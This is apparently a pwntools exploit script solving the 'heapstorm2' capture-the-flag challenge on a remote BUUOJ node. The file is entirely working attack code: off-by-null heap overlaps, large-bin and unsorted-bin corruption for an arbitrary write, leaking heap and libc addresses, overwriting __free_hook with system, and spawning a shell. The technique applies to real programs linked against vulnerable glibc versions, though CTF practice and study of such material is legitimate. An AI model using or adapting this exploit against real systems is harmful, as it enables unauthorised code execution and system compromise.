from pwn import *
context.log_level = 'debug'
prog = './heapstorm2'
elf = ELF(prog)
#p = process(prog)
#,env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF("./libc-2.23.so")
p = remote("node3.buuoj.cn", 25167)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size):
	p.sendlineafter("Command: ", '1')
	p.sendlineafter("Size: ", str(size))
def show(idx):
	p.sendlineafter("Command: ", '4')
	p.sendlineafter("", str(idx))
def edit(idx, content):
	p.sendlineafter("Command: ", '2')
	p.sendlineafter("Index: ", str(idx))
	p.sendlineafter("Size: ", str(len(content)))
	p.sendafter("Content: ", content)
def free(idx):
	p.sendlineafter("Command: ", '3')
	p.sendlineafter("Index: ", str(idx))
def exp():
	add(0x18)#0
	add(0x508)#1 0x020
	add(0x18)#2 0x530
	edit(1, 'a'*0x4f0+p64(0x500))
	
	add(0x18)#3  0x550
	add(0x508)#4 0x570
	add(0x18)#5   0xa80
	edit(4, 'a'*0x4f0+p64(0x500))
	add(0x18)#6  0xaa0


	free(1)
	edit(0, 'a'*12)
	add(0x18)#1  0x020
	add(0x4d8)#7  0x040
	free(1)
	free(2)
	add(0x68)  #1 0x020
	add(0x4b8) #2 0x090
	
	free(4)
	edit(3, 'a'*12)
	add(0x18)  #4 0x570
	add(0x4d8) #8 0x590
	free(4)
	free(5)
	add(0x48)  #4  0x570
	#add(0x4e8) #5  0x5b0
	free(2)
	add(0x4c8)
	free(2)
	
	target = 0x13370800-0x20
	pay = p64(0)*9+p64(0x4c1)+p64(0)+p64(target+8)+p64(0)+p64(target-0x18-5)
	edit(7, pay)
	pay = p64(0)*5+p64(0x4e1)+p64(0)+p64(target)
	edit(8, pay)
	add(0x48)#2
	
	pay = p64(0)*5+p64(0x13377331)+p64(0x13370830)
	edit(2, pay)
	edit(0, p64(0x133707db+8)+ p64(8))
	show(1)
	p.recvuntil("[1]: ")

	heap = u64(p.recv(6)+'\x00'*2)
	log.info("heap ==> "+hex(heap)) 
	edit(0, p64(heap+0x10)+p64(8))
	show(1)
	p.recvuntil("[1]: ")
	libc.address = u64(p.recv(6)+'\x00'*2)-0x00007fdb4d2d9b78+0x7fdb4cf15000
	log.info("libc.address ==> "+hex(libc.address)) 
	edit(0, p64(libc.sym['__free_hook'])+p64(8)+p64(0x13370848)+'/bin/sh\x00')
	edit(1, p64(libc.sym['system']))
	free(2)
	#dbg()


	p.interactive()
if __name__ == '__main__':
	exp()
